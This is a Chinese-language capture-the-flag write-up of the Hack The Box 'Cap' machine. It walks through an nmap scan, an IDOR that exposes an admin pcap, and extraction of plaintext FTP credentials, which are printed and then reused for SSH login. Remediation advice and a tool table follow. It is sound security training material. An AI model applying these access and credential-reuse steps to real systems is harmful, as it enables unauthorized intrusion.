---
title: "HTB Starting Point - Cap 渗透测试报告"
date: 2026-07-10T16:10:00+08:00
draft: false
categories: ["渗透测试"]
tags: ["HTB", "Starting Point", "Cap", "IDOR", "PCAP分析", "FTP明文密码"]
---

## HTB Starting Point - Cap 渗透测试报告

### 一、靶机信息

| 项目 | 内容 |
|------|------|
| 平台 | Hack The Box (HTB) |
| 分类 | Academy / Starting Point |
| 机器名 | Cap |
| 目标 IP | 10.129.53.230 |
| 难度 | 入门级 |

---

### 二、渗透测试完整流程

#### 阶段 1：信息收集（端口扫描）

```bash
nmap -sV -T4 -Pn 10.129.53.230
```

**扫描结果：**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    gunicorn
```

**关键发现：** 三个端口开放——FTP(21)、SSH(22)、HTTP(80)。80 端口是 Python gunicorn 跑的 Web 应用，题目为 "Security Dashboard"。

---

#### 阶段 2：Web 应用枚举

浏览器访问 `http://10.129.53.230`，页面是一个 PCAP 文件上传分析平台。浏览功能时发现 URL 中存在数字参数：

```
/data/1    ← 当前用户的数据
```

这就是潜在的 **IDOR（越权访问）** 入口。

---

#### 阶段 3：IDOR 漏洞利用

将 `/data/1` 改为 `/data/0`，成功访问到管理员的数据：

```
http://10.129.53.230/data/0
```

页面列出了管理员的 PCAP 抓包记录。下载 `0.pcap` 文件到本地。

---

#### 阶段 4：PCAP 分析 —— 提取 FTP 凭证

PCAP 文件是网络抓包数据，记录了管理员在内部网络中的 TCP 流量。FTP 协议**明文传输**，用户名和密码直接可见。

在 Windows 上使用 Wireshark（图形化）或者命令行提取：

```bash
# 方法 1：Wireshark GUI
# 双击打开 0.pcap → 右键任意 FTP 数据包 → Follow → TCP Stream

# 方法 2：Python 命令行
python -c "
data = open('0.pcap', 'rb').read()
text = ''.join(chr(b) if 32 <= b < 127 else '\n' for b in data)
print(text)
" | findstr "PASS"
```

**提取到的凭证：**

```
USER: nathan
PASS: Buck3tH4TF0RM3!
230 Login successful.
```

---

#### 阶段 5：SSH 登录与 Flag 获取

使用提取的凭证通过 SSH 登录目标机器：

```bash
ssh nathan@10.129.53.230
# 密码：Buck3tH4TF0RM3!
```

登录成功后获取 flag：

```bash
cat /home/nathan/user.txt   # 用户 flag
cat /root/root.txt           # root flag（如有提权）
```

---

### 三、攻击链总结

```
nmap 扫描
    │
    ▼
发现 80 端口 Web 应用 → 发现 URL 参数 /data/1
    │
    ▼
IDOR 越权 → /data/0 访问管理员数据
    │
    ▼
下载 pcap 抓包 → FTP 明文密码泄露
    │
    ▼
SSH 登录（nathan / Buck3tH4TF0RM3!）→ 拿 flag
```

**核心教训：**
1. URL 里的数字参数 = IDOR 测试点
2. FTP/Telnet/HTTP 都是明文协议，抓到包就能看密码
3. 多个漏洞链式利用：IDOR → 信息泄露 → 凭据重用

---

### 四、三种漏洞详解

#### 4.1 越权访问（IDOR）

| 要素 | 说明 |
|------|------|
| 触发点 | `/data/1` 中的数字 ID |
| 利用方式 | 改为 `/data/0` 访问他人资源 |
| 漏洞原因 | 服务端未校验资源归属 |
| 修复方案 | 服务端加权限校验，禁止从参数直接读取用户标识 |

#### 4.2 FTP 明文密码泄露

| 要素 | 说明 |
|------|------|
| 泄露源 | PCAP 抓包文件 |
| 泄露内容 | 用户名 `nathan` + 密码 `Buck3tH4TF0RM3!` |
| 根本原因 | FTP 不加密，密码在网络中明文传输 |
| 修复方案 | 替换为 SFTP（端口 22）或 FTPS |

#### 4.3 凭据重用

管理员 FTP 和 SSH 用同一套密码，拿到 FTP 密码就等于拿到 SSH 密码。

---

### 五、修复建议

| 问题 | 建议 |
|------|------|
| IDOR 越权 | 服务端使用 session 判定用户身份，不依赖 URL 参数 |
| FTP 明文传输 | 禁用 FTP，改用 SFTP |
| 密码存储 | 敏感系统使用独立密码，避免凭据重用 |
| PCAP 文件暴露 | 上传文件应限制访问权限，不允许多用户间共享 |
| 审计日志 | 记录文件访问行为，异常大量下载触发告警 |

---

### 六、工具速查

| 场景 | 工具 | 命令示例 |
|------|------|----------|
| 端口扫描 | nmap | `nmap -sV -T4 -Pn <IP>` |
| PCAP 分析 (GUI) | Wireshark | 右键 → Follow → TCP Stream |
| PCAP 分析 (CLI) | Python | 读取二进制搜 "PASS" |
| SSH 登录 | ssh | `ssh user@<IP>` |
